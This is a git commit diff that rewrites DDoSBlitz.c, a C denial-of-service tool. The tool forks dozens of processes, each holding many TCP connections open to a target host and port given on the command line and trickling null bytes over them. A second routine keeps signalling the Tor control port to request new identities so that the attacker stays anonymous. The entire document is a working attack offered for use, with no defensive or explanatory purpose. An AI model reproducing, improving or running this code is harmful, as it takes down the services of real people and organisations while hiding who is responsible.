26eb51dabe07d319f6ffa5e4bda6d55fd3a3afe5
New71k <151418907+New71k@users.noreply.github.com>
2024-07-23 01:30:33 -0300

    Update DDoSBlitz.c

--- DDoSBlitz.c
+++ DDoSBlitz.c
@@ -1,117 +1,95 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdint.h>
 #include <unistd.h>
-#include <signal.h>
 #include <netdb.h>
+#include <signal.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define CONNECTIONS 16
-#define THREADS 64
-#define BUFFER_SIZE 1
-#define SLEEP_DURATION 100000
-
-void handle_signal(int signal) {
-}
-
-int create_socket(const char *host, const char *port) {
+int make_socket(char *host, char *port) {
     struct addrinfo hints, *servinfo, *p;
-    int sockfd;
-    int result;
-
+    int sock, r;
     memset(&hints, 0, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
-
-    if ((result = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
-        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(result));
-        exit(EXIT_FAILURE);
+    if((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
+        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+        exit(0);
     }
-
-    for (p = servinfo; p != NULL; p = p->ai_next) {
-        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+    for(p = servinfo; p != NULL; p = p->ai_next) {
+        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
             continue;
         }
-
-        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
-            close(sockfd);
+        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
+            close(sock);
             continue;
         }
-
         break;
     }
-
-    if (p == NULL) {
-        freeaddrinfo(servinfo);
-        fprintf(stderr, "Unable to connect to %s:%s\n", host, port);
-        exit(EXIT_FAILURE);
+    if(p == NULL) {
+        if(servinfo)
+            freeaddrinfo(servinfo);
+        fprintf(stderr, "No connection could be made\n");
+        exit(0);
     }
-
-    freeaddrinfo(servinfo);
-    return sockfd;
+    if(servinfo)
+        freeaddrinfo(servinfo);
+    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+    return sock;
 }
 
-void perform_attack(const char *host, const char *port, int id) {
+void broke(int s) {
+}
+
+#define CONNECTIONS 8
+#define THREADS 48
+
+void attack(char *host, char *port, int id) {
     int sockets[CONNECTIONS];
-    int i;
-    ssize_t bytes_written;
-
-    memset(sockets, 0, sizeof(sockets));
-    signal(SIGPIPE, handle_signal);
-
-    while (1) {
-        for (i = 0; i < CONNECTIONS; i++) {
-            if (sockets[i] == 0) {
-                sockets[i] = create_socket(host, port);
-            }
-
-            bytes_written = write(sockets[i], "\0", BUFFER_SIZE);
-            if (bytes_written == -1) {
-                close(sockets[i]);
-                sockets[i] = create_socket(host, port);
-            }
-
-            fprintf(stderr, "[Thread %d: Data sent]\n", id);
+    int x, g = 1, r;
+    for(x = 0; x != CONNECTIONS; x++)
+        sockets[x] = 0;
+    signal(SIGPIPE, &broke);
+    while(1) {
+        for(x = 0; x != CONNECTIONS; x++) {
+            if(sockets[x] == 0)
+                sockets[x] = make_socket(host, port);
+            r = write(sockets[x], "\0", 1);
+            if(r == -1) {
+                close(sockets[x]);
+                sockets[x] = make_socket(host, port);
+            } else
+                fprintf(stderr, "[%i: %s DDos Sent]\n", id, host);
         }
-
-        usleep(SLEEP_DURATION);
+        fprintf(stderr, "[%i: %s DDos Sent]\n", id, host);
+        usleep(300000);
     }
 }
 
 void cycle_identity() {
-    int sockfd;
-    ssize_t bytes_written;
-
-    sockfd = create_socket("localhost", "9050");
-    write(sockfd, "AUTHENTICATE \"\"\n", 16);
-
-    while (1) {
-        bytes_written = write(sockfd, "signal NEWNYM\n\x00", 16);
-        fprintf(stderr, "[Identity cycled: %ld bytes written]\n", bytes_written);
-        usleep(SLEEP_DURATION);
+    int r;
+    int socket = make_socket("localhost", "9050");
+    write(socket, "AUTHENTICATE \"\"\n", 16);
+    while(1) {
+        r = write(socket, "signal NEWNYM\n\x00", 16);
+        fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM]\n", r);
+        usleep(300000);
     }
 }
 
 int main(int argc, char **argv) {
-    int i;
-
-    if (argc != 3) {
-        fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
-        exit(EXIT_FAILURE);
+    int x;
+    if(argc != 3)
+        cycle_identity();
+    for(x = 0; x != THREADS; x++) {
+        if(fork())
+            attack(argv[1], argv[2], x);
+        usleep(200000);
     }
-
-    for (i = 0; i < THREADS; i++) {
-        if (fork() == 0) {
-            perform_attack(argv[1], argv[2], i);
-            exit(EXIT_SUCCESS);
-        }
-
-        usleep(100000);
-    }
-
     getc(stdin);
     return 0;
 }
